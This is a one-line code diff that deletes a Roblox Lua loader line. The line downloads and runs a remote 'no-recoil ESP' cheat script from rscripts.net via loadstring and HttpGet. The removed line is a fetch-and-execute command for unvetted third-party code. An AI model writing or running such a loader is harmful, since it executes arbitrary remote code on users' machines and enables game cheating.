@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://rscripts.net/raw/no-recoil-esp-keyless_1776252817051_F9BIlMjEtK.txt",true))()
